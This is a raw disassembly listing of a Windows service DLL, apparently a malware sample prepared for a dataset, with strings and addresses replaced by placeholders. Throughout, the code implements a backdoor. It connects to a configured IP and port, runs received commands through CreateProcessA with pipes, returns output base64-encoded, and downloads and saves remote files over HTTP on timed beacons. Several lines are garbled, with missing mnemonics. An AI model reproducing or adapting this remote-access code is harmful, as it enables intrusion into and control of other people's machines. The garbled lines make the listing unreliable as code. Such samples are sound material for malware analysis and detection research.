sub_10001000
push 0xa
call [ Sleep@IAT ]
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
push 0x1
pop eax
retn 0xc
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov edi 0x104
mov esi rw-data
push edi
push 0x0
push esi
mov [ rw-data ] ebx
call memset
add esp 0xc
push edi
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
ServiceMain
push ebp
mov ebp esp
sub esp 0x100
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi 0x100
push esi
lea eax [ ebp - 0x100 ]
push [ edi ]
push eax
call [ strncpy@IAT ]
push esi
lea eax [ ebp - 0x100 ]
push [ edi ]
push eax
call [ wcstombs@IAT ]
add esp 0x18
lea eax [ ebp - 0x100 ]
push sub_10002799
push eax
call [ RegisterServiceCtrlHandlerA@IAT ]
xor esi esi
mov [ rw-data ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
leave
retn 0x8
push 0x1
push esi
push 0x2
call sub_10002751
push esi
push esi
push 0x4
call sub_10002751
add esp 0x18
push 0xea60
call [ Sleep@IAT ]
call sub_100010cd
call sub_10001139
sub_100010cd
push ebp
mov ebp esp
sub esp 0x210
mov al [ rw-data ]
push edi
push 0x1f
mov [ ebp - 0x80 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x7f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x210 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
pop edi
jne r-xdata
push esi
call [ WSACleanup@IAT ]
lea eax [ ebp - 0x80 ]
mov esi rw-data
push eax
push esi
call strcpy
push rw-data
push esi
call strcat
add esp 0x10
pop esi
leave
retn
lea eax [ ebp - 0x80 ]
push 0x80
push eax
call [ gethostname@IAT ]
sub_10001139
sub esp 0x50
push ebx
push ebp
push esi
mov esi [ Sleep@IAT ]
push edi
xor ebx ebx
mov ebp rw-data
mov [ esp + eax + 0x21 ] bl
movsx eax [ rw-data ]
sub eax 0x43
je r-xdata
mov cl [ ecx ]
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax 0x40
jb r-xdata
push rw-data
lea eax [ esp + 0x24 ]
push ebx
push eax
push sub_100012b0
push ebx
push ebx
mov [ rw-data ] ebx
call [ CreateThread@IAT ]
push rw-data
mov [ rw-data ] eax
call [ GetSystemTime@IAT ]
mov edi [ WaitForSingleObject@IAT ]
push ebx
push [ rw-data ]
sub eax 0xe
je r-xdata
cmp [ eax + rw-data ] bl
lea ecx [ eax + rw-data ]
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
call [ GetSystemTime@IAT ]
movzx eax [ rw-data ]
movzx ecx [ esp + 0x1a ]
sub ecx eax
cmp ecx 0x14
jge r-xdata
push 0x2
lea eax [ esp + 0x24 ]
push rw-data
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
dec eax
dec eax
je r-xdata
call sub_10002067
push 0x40
mov edi rw-data
push ebx
push edi
call memset
push edi
push ebp
call sub_1000216d
push 0x40
push ebx
push ebp
call memset
mov al [ rw-data ]
add esp 0x20
mov [ esp + 0x20 ] al
xor eax eax
push 0xf
lea edi [ esp + 0x25 ]
pop ecx
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
push 0x927c0
jmp r-xdata
push ebx
mov [ rw-data ] 0x1
push [ rw-data ]
call [ TerminateThread@IAT ]
mov [ rw-data ] ebx
push 0xea60
call esi
push ebx
push [ rw-data ]
jmp r-xdata
push 0x36ee80
jmp r-xdata
push 0x5265c00
jmp r-xdata
lea eax [ esp + 0x20 ]
push eax
call [ atoi@IAT ]
imul eax eax 0xea60
pop ecx
push eax
sub eax 0x10
je r-xdata
call esi
jmp r-xdata
call edi
test eax eax
je r-xdata
sub eax 0xe
je r-xdata
dec eax
dec eax
je r-xdata
sub_100012b0
push ebp
mov ebp esp
mov eax 0x17cc
call sub_10002830
push ebx
push esi
push edi
xor ebx ebx
xor eax eax
lea edi [ ebp - 0x23 ]
mov [ ebp - 0x24 ] bl
mov [ ebp - 0xc ] bl
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0xb ]
stosd [ edi ]
stosd [ edi ]
push 0x1
stosb [ edi ]
pop esi
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push rw-data
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esi
call [ sscanf@IAT ]
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x34 ] 0x2
push eax
call strlen
add esp 0x14
cmp eax 0xf
ja r-xdata
xor eax eax
lea eax [ ebp - 0x24 ]
push eax
call [ inet_addr@IAT ]
mov edi [ atoi@IAT ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0xc ]
push eax
call edi
test eax eax
pop ecx
jle r-xdata
lea eax [ ebp - 0xc ]
push eax
call edi
cmp eax 0xffff
pop ecx
jge r-xdata
lea eax [ ebp - 0xc ]
push eax
call edi
pop ecx
push eax
call [ htons@IAT ]
mov [ ebp - 0x32 ] ax
lea eax [ ebp - 0x3cc ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push 0x6
push esi
push 0x2
call [ WSASocketA@IAT ]
mov esi eax
or edi 0xffffffff
cmp esi edi
jne r-xdata
lea eax [ ebp - 0x34 ]
push 0x10
push eax
push esi
call [ connect@IAT ]
cmp eax edi
je r-xdata
push edi
call [ closesocket@IAT ]
jmp r-xdata
push 0x2
push esi
call [ shutdown@IAT ]
push esi
call [ closesocket@IAT ]
call [ WSACleanup@IAT ]
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x8004667e
push esi
call [ ioctlsocket@IAT ]
cmp eax edi
jne r-xdata
call [ WSACleanup@IAT ]
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
push ebx
push [ r--data ]
call strlen
pop ecx
push eax
push [ r--data ]
push esi
call [ send@IAT ]
cmp eax edi
je r-xdata
push esi
call [ closesocket@IAT ]
push 0x1
pop ebx
mov edi 0x1400
lea eax [ ebp - 0x138 ]
push eax
push esi
call __WSAFDIsSet
test eax eax
je r-xdata
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
push ebx
lea eax [ ebp - 0x17cc ]
push edi
push eax
push esi
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
lea eax [ ebp - 0x17cc ]
push ebx
push eax
call memset
add esp 0xc
mov [ ebp - 0x134 ] esi
mov [ ebp - 0x238 ] esi
push 0x1
pop eax
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x23c ] eax
push ebx
lea eax [ ebp - 0x23c ]
push ebx
push eax
lea eax [ ebp - 0x138 ]
push eax
push ebx
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ r--data ]
call strlen
push eax
lea eax [ ebp - 0x17cc ]
push [ r--data ]
push eax
call [ _strnicmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
push [ rw-data ]
call strlen
push eax
lea eax [ ebp - 0x17cc ]
push [ rw-data ]
push eax
call [ _strnicmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
push [ rw-data ]
call strlen
push eax
lea eax [ ebp - 0x17cc ]
push [ rw-data ]
push eax
call [ _strnicmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_1000152c
pop ecx
jmp r-xdata
sub_1000152c
push ebp
mov ebp esp
sub esp 0xbbc
push ebx
push esi
push edi
push 0x4a
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x2b7 ]
mov [ ebp - 0x2b8 ] bl
mov [ ebp - 0x9bc ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xff
xor eax eax
lea edi [ ebp - 0x9bb ]
mov esi 0x200
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ax [ rw-data ]
lea edi [ ebp - 0x26 ]
mov [ ebp - 0x28 ] ax
xor eax eax
stosd [ edi ]
push esi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1c ] 0x6
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x34 ] 0xc
stosd [ edi ]
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x1
call ??2@YAPAXI@Z
mov [ ebp - 0x10 ] eax
pop ecx
lea eax [ ebp - 0x5bc ]
push eax
push esi
call [ GetCurrentDirectoryA@IAT ]
lea eax [ ebp - 0x5bc ]
push rw-data
push eax
call strcat
pop ecx
mov esi 0x1400
pop ecx
mov edi rw-data
cmp [ ebp - 0x8 ] ebx
je r-xdata
lea eax [ ebp - 0x78 ]
mov [ ebp - 0x78 ] 0x44
push eax
call [ GetStartupInfoA@IAT ]
mov eax [ ebp - 0x4 ]
push rw-data
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x2b8 ]
mov [ ebp - 0x48 ] bx
push eax
mov [ ebp - 0x4c ] 0x101
call strcat
push esi
push ebx
push edi
call memset
push esi
push ebx
push rw-data
call memset
push esi
push ebx
push rw-data
call memset
lea eax [ ebp - 0x5bc ]
push eax
push rw-data
call strcat
mov eax [ ebp + 0x8 ]
add esp 0x34
mov [ ebp - 0x188 ] eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x18c ]
push ebx
push eax
push ebx
push ebx
mov [ ebp - 0x18c ] 0x1
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x4 ] ebx
pop edi
pop esi
pop ebx
je r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x18c ]
push eax
push [ ebp + 0x8 ]
call __WSAFDIsSet
test eax eax
je r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov eax [ ebp + 0x8 ]
push esi
push ebx
push edi
mov [ ebp - 0x3b8 ] eax
mov [ ebp - 0x3bc ] 0x1
call memset
push esi
push ebx
push rw-data
call memset
add esp 0x18
lea eax [ ebp - 0x3bc ]
push ebx
push ebx
push ebx
push eax
push ebx
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
push ebx
push rw-data
push rw-data
call sub_100019e9
add esp 0xc
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0xc ] eax
push ebx
push 0x4
push 0xa
push ecx
push eax
call [ _itoa@IAT ]
add esp 0xc
push eax
push [ ebp + 0x8 ]
call [ send@IAT ]
push [ ebp - 0xc ]
push rw-data
push [ ebp + 0x8 ]
call sub_100021e2
add esp 0xc
lea eax [ ebp - 0x3bc ]
push eax
push [ ebp + 0x8 ]
call __WSAFDIsSet
test eax eax
je r-xdata
lea eax [ ebp - 0x34 ]
push ebx
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x14 ] ebx
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
push rw-data
call [ GetSystemTime@IAT ]
push ebx
push 0x13ff
push rw-data
push [ ebp + 0x8 ]
call [ recv@IAT ]
push ebx
push rw-data
push edi
mov [ ebp - 0xc ] eax
call sub_10001c3c
add esp 0xc
cmp [ ebp - 0xc ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call [ closesocket@IAT ]
push 0x7
push rw-data
push edi
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push rw-data
push edi
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
je r-xdata
push rw-data
push edi
call [ strstr@IAT ]
add eax 0x8
push eax
push [ ebp - 0x10 ]
call strcpy
push [ ebp - 0x10 ]
call sub_10001e7c
add esp 0x14
jmp r-xdata
push 0x4
push rw-data
push edi
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
je r-xdata
push 0x2
push rw-data
push edi
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x2b8 ]
push edi
push eax
call [ strncat@IAT ]
add esp 0xc
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
push ebx
push ebx
push 0x10
push 0x1
push ebx
lea eax [ ebp - 0x2b8 ]
push ebx
push eax
push ebx
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
push rw-data
push edi
call [ strstr@IAT ]
add eax 0x3
push eax
lea eax [ ebp - 0xbbc ]
push eax
call strcpy
lea eax [ ebp - 0xbbc ]
push eax
call [ _chdir@IAT ]
add esp 0x14
test eax eax
jne r-xdata
push 0x12c
lea eax [ ebp - 0x2b8 ]
push ebx
push eax
call memset
add esp 0xc
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x5bc ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
lea eax [ ebp - 0x5bc ]
push rw-data
push eax
call strcat
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
jmp r-xdata
push esi
push ebx
push edi
call memset
push esi
push ebx
push rw-data
call memset
push esi
push ebx
push rw-data
call memset
lea eax [ ebp - 0x9bc ]
push eax
push rw-data
call strcat
mov eax [ ebp + 0x8 ]
add esp 0x2c
mov [ ebp - 0x188 ] eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x18c ]
push ebx
push eax
push ebx
push ebx
mov [ ebp - 0x18c ] 0x1
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x18c ]
push eax
push [ ebp + 0x8 ]
call __WSAFDIsSet
test eax eax
je r-xdata
push 0x400
lea eax [ ebp - 0x9bc ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
push ebx
push eax
lea eax [ ebp - 0x9bc ]
push 0x400
push eax
push [ ebp - 0x8 ]
call [ ReadFile@IAT ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
push ebx
push rw-data
push rw-data
call sub_100019e9
add esp 0xc
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0xc ] eax
push ebx
push 0x4
push 0xa
push ecx
push eax
call [ _itoa@IAT ]
add esp 0xc
push eax
push [ ebp + 0x8 ]
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0xc ]
push rw-data
push [ ebp + 0x8 ]
call sub_100021e2
add esp 0xc
jmp r-xdata
sub_100019e9
push ebp
mov ebp esp
sub esp 0x124
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
test ecx ecx
push edi
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
and [ ebp + 0x8 ] 0x0
mov [ ebp + 0xc ] eax
lea eax [ ecx - 0x3 ]
mov [ ebp - 0x8 ] esi
test eax eax
mov ebx rw-data
jle r-xdata
push esi
call strlen
pop ecx
mov [ ebp + 0x10 ] eax
mov ecx eax
cmp [ ebp + 0x8 ] ecx
jge r-xdata
push 0x3
add eax 0x2
xor edx edx
pop ecx
div ecx
mov ecx eax
mov [ ebp - 0xc ] eax
shl ecx 0x2
lea eax [ eax + eax * 2 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
and [ eax ] 0x0
mov eax [ ebp - 0x4 ]
leave
retn
sub ecx [ ebp + 0x8 ]
xor edx edx
mov [ ebp + 0x10 ] edx
test ecx ecx
mov [ ebp + 0x8 ] ecx
jle r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
mov eax edx
shr eax 0x2
and eax 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
mov esi [ ebp - 0x8 ]
mov eax ecx
lea edi [ ebp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp + 0x10 ]
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x124 ]
jmp r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x9c ]
jmp r-xdata
movsx eax al
mov [ ebp - 0x10 ] eax
mov eax edx
mov ecx edx
push 0x10
shr eax 0xc
and ecx 0x3
and eax 0xf
shl ecx 0x4
or eax ecx
pop ecx
mov esi ebx
lea edi [ ebp - 0x9c ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov cl 0x3d
cmp edx 0x40
jge r-xdata
mov al [ ebp + eax - 0xe0 ]
jmp r-xdata
movsx eax al
mov [ ebp - 0x14 ] eax
mov eax edx
shr eax 0x8
mov ecx edx
and eax 0xf
shr ecx 0x16
shl eax 0x2
and ecx 0x3
push 0x10
or eax ecx
pop ecx
mov esi ebx
lea edi [ ebp - 0xe0 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
mov eax edx
mov ecx edx
shr eax 0x8
and eax 0xf
push 0x10
shr ecx 0x16
shl eax 0x2
and ecx 0x3
mov esi ebx
or eax ecx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x10
mov esi ebx
lea edi [ ebp - 0x58 ]
mov [ ecx ] al
mov eax edx
mov ecx edx
shr eax 0xc
and ecx 0x3
and eax 0xf
shl ecx 0x4
or eax ecx
pop ecx
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
push 0x10
pop ecx
mov esi ebx
lea edi [ ebp - 0x124 ]
mov edx [ eax ]
[ edi ] [ esi ]
mov eax edx
shr eax 0x2
and eax 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ebp + edx - 0x58 ]
jmp r-xdata
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
shr edx 0x10
and edx 0x3f
movsx eax al
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
shr edx 0x10
and edx 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
cmp eax 0x40
jge r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x1
mov [ ecx + 0x1 ] al
jle r-xdata
movsx ecx cl
shl ecx 0x8
or ecx eax
mov eax [ ebp + 0xc ]
shl ecx 0x8
or ecx [ ebp - 0x14 ]
add [ ebp + 0xc ] 0x4
add [ ebp - 0x8 ] 0x3
shl ecx 0x8
or ecx [ ebp - 0x10 ]
dec [ ebp - 0xc ]
mov [ eax ] ecx
jne r-xdata
cmp edx 0x40
jge r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov al [ ebp + edx - 0x58 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x2
mov [ ecx + 0x2 ] al
jle r-xdata
mov ecx [ ebp + 0xc ]
add [ ebp + 0xc ] 0x4
add [ ebp - 0x4 ] 0x4
mov [ ecx + 0x3 ] al
sub_10001c3c
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
test eax eax
push edi
jne r-xdata
and [ ebp + 0xc ] 0x0
and [ ebp - 0xc ] 0x0
mov ebx [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
test ecx ecx
mov [ ebp - 0x8 ] esi
jle r-xdata
push esi
call strlen
pop ecx
mov [ ebp + 0x10 ] eax
cmp [ ebp - 0xc ] eax
jge r-xdata
lea eax [ ecx + 0x3 ]
shr eax 0x2
mov [ ebp - 0x10 ] eax
lea ecx [ eax + eax * 2 ]
shl eax 0x2
mov [ ebp + 0xc ] ecx
mov [ ebp - 0xc ] eax
and [ ebx ] 0x0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
leave
retn
sub eax [ ebp - 0xc ]
xor esi esi
mov [ ebp + 0x10 ] esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
mov [ ebp + 0x8 ] edi
shr [ ebp + 0x8 ] 0x8
push [ ebp + 0x8 ]
call sub_10001e30
mov esi eax
push edi
and esi 0xff0
shl esi 0x2
sar esi 0x6
call sub_10001e30
mov [ ebp - 0x4 ] edi
and eax 0x3f
shr [ ebp - 0x4 ] 0x10
push [ ebp - 0x4 ]
shl eax 0x2
or esi eax
call sub_10001e30
push [ ebp + 0x8 ]
and eax 0x3fc
shl eax 0x2
sar eax 0x4
mov [ ebp - 0x14 ] eax
call sub_10001e30
mov ecx [ ebp - 0x14 ]
and eax 0xf
shl eax 0x4
shr edi 0x18
or ecx eax
push edi
mov [ ebp + 0x8 ] ecx
call sub_10001e30
push [ ebp - 0x4 ]
mov edi eax
and edi 0xff
shl edi 0x2
sar edi 0x2
call sub_10001e30
and eax 0x3
add [ ebp - 0x8 ] 0x4
shl eax 0x6
or edi eax
add esp 0x18
shl edi 0x8
or edi [ ebp + 0x8 ]
shl edi 0x8
or edi esi
mov [ ebx ] edi
add ebx 0x3
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] esi
shr [ ebp + 0x10 ] 0x8
push [ ebp + 0x10 ]
call sub_10001e30
mov edx eax
push esi
shl edx 0x2
sar edx 0x6
mov [ ebp + 0x8 ] edx
call sub_10001e30
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
shl al 0x2
or cl al
mov eax esi
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
and eax 0xff00
cmp eax 0x3d00
je r-xdata
mov esi [ ebp - 0x8 ]
mov ecx eax
lea edi [ ebp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp + 0x10 ]
mov eax esi
and eax 0xff0000
cmp eax 0x3d0000
je r-xdata
mov eax esi
and eax 0xff0000
cmp eax 0x3d0000
je r-xdata
mov eax esi
and eax 0xff000000
cmp eax 0x3d000000
je r-xdata
mov eax esi
shr eax 0x10
push eax
call sub_10001e30
push [ ebp + 0x10 ]
mov edx eax
shl edx 0x2
sar edx 0x4
mov [ ebp + 0x10 ] edx
call sub_10001e30
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
shl al 0x4
or cl al
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
mov eax esi
shr eax 0x18
push eax
call sub_10001e30
mov edx eax
shl edx 0x2
shr esi 0x10
sar edx 0x2
push esi
mov [ ebp + 0x10 ] edx
call sub_10001e30
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
shl al 0x6
or cl al
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
sub_10001e30
mov cl [ esp + 0x4 ]
or eax 0xffffffff
cmp cl 0x41
jl r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x5a
jg r-xdata
cmp cl 0x30
jl r-xdata
cmp cl 0x7a
jg r-xdata
movsx eax cl
sub eax 0x41
retn
cmp cl 0x2b
jne r-xdata
cmp cl 0x39
jg r-xdata
movsx eax cl
sub eax 0x47
retn
cmp cl 0x2f
jne r-xdata
push 0x3e
pop eax
retn
movsx eax cl
add eax 0x4
retn
retn
push 0x3f
pop eax
sub_10001e7c
push ebp
mov ebp esp
sub esp 0xc0
push ebx
push esi
push edi
push 0xf
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0xbf ]
mov [ ebp - 0xc0 ] bl
push 0xf
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x5f ]
mov [ ebp - 0x60 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x4 ] ebx
push eax
lea eax [ ebp - 0xc0 ]
push eax
push rw-data
push [ ebp + 0x8 ]
call [ sscanf@IAT ]
add esp 0x10
push ebx
push ebx
push ebx
push ebx
push rw-data
call [ InternetOpenA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp + 0x8 ] edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
push 0x400000
mov eax rw-data
push 0x3
push eax
push eax
lea eax [ ebp - 0xc0 ]
push ebx
push eax
push edi
call [ InternetConnectA@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0xc ] esi
jne r-xdata
push ebx
push 0x4000000
push rw-data
push ebx
lea eax [ ebp - 0x60 ]
push rw-data
push eax
push rw-data
push esi
call [ HttpOpenRequestA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
push edi
call [ InternetCloseHandle@IAT ]
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push edi
call [ HttpSendRequestA@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
mov edi [ InternetCloseHandle@IAT ]
call edi
push esi
call edi
jmp r-xdata
mov esi [ InternetCloseHandle@IAT ]
push edi
call esi
push [ ebp - 0xc ]
call esi
push [ ebp + 0x8 ]
call esi
mov esi [ HttpQueryInfoA@IAT ]
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] 0x10
push eax
push 0x13
push edi
call esi
lea eax [ ebp - 0x20 ]
push eax
call [ atoi@IAT ]
cmp eax 0x194
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x80 ]
push eax
push 0x5
push edi
mov [ ebp - 0x8 ] 0x20
call esi
lea eax [ ebp - 0x80 ]
push eax
call [ atol@IAT ]
mov esi eax
lea eax [ esi + 0x1 ]
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x10 ] eax
pop ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push eax
push edi
call [ InternetReadFile@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
push 0x200
call ??2@YAPAXI@Z
pop ecx
mov esi eax
push esi
push 0x40
call [ GetCurrentDirectoryA@IAT ]
push 0x40
push esi
push esi
call [ GetLongPathNameA@IAT ]
push rw-data
push esi
call strcat
lea eax [ ebp - 0x60 ]
push eax
push esi
call strcat
push rw-data
push esi
call [ fopen@IAT ]
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
push esi
push [ ebp - 0x4 ]
push 0x1
push [ ebp - 0x10 ]
call [ fwrite@IAT ]
push esi
call [ fflush@IAT ]
push esi
call [ fclose@IAT ]
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
add esp 0x1c
sub_10002067
sub esp 0x18
push ebx
push ebp
push esi
mov esi [ InternetCloseHandle@IAT ]
push edi
mov edi [ Sleep@IAT ]
mov ebx 0x927c0
push ebp
push 0x400000
mov ecx rw-data
push 0x3
push ecx
push ecx
push 0x50
push rw-data
push eax
call [ InternetConnectA@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
push ebx
call edi
jmp r-xdata
push [ esp + 0x10 ]
push 0x0
push 0x4000000
push rw-data
push 0x0
push rw-data
push rw-data
push rw-data
push ebp
call [ HttpOpenRequestA@IAT ]
xor ecx ecx
mov [ esp + 0x14 ] eax
cmp eax ecx
jne r-xdata
xor ebp ebp
push ebp
push ebp
push ebp
push ebp
push rw-data
call [ InternetOpenA@IAT ]
cmp eax ebp
mov [ esp + 0x10 ] eax
jne r-xdata
push ecx
push ecx
push ecx
push ecx
push eax
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call esi
push ebp
jmp r-xdata
lea eax [ esp + 0x18 ]
push eax
push 0x40
push rw-data
push [ esp + 0x20 ]
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
lea ecx [ esp + 0x1c ]
push 0xa
push ecx
push eax
call [ _itoa@IAT ]
add esp 0xc
jmp r-xdata
call esi
jmp r-xdata
push [ esp + 0x14 ]
call esi
push ebp
call esi
push [ esp + 0x10 ]
call esi
mov al [ rw-data ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
push [ esp + 0x14 ]
call esi
push ebp
call esi
sub_1000216d
push ebp
mov ebp esp
sub esp 0x40
mov ax [ rw-data ]
push esi
push edi
push 0xf
mov [ ebp - 0x40 ] ax
pop ecx
xor eax eax
lea edi [ ebp - 0x3e ]
mov esi [ strstr@IAT ]
push rw-data
push [ ebp + 0x8 ]
[ edi ]
stosw [ edi ]
call esi
push rw-data
mov edi eax
push [ ebp + 0x8 ]
call esi
add esp 0x10
test edi edi
je r-xdata
xor eax eax
test eax eax
je r-xdata
sub eax edi
add edi 0x4
sub eax 0x4
push eax
lea eax [ ebp - 0x40 ]
push edi
push eax
call [ strncpy@IAT ]
lea eax [ ebp - 0x40 ]
push 0x0
push eax
push [ ebp + 0xc ]
call sub_10001c3c
add esp 0x18
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
leave
retn
sub_100021e2
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
mov esi edi
jle r-xdata
mov eax edi
push 0x0
push esi
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call [ send@IAT ]
test eax eax
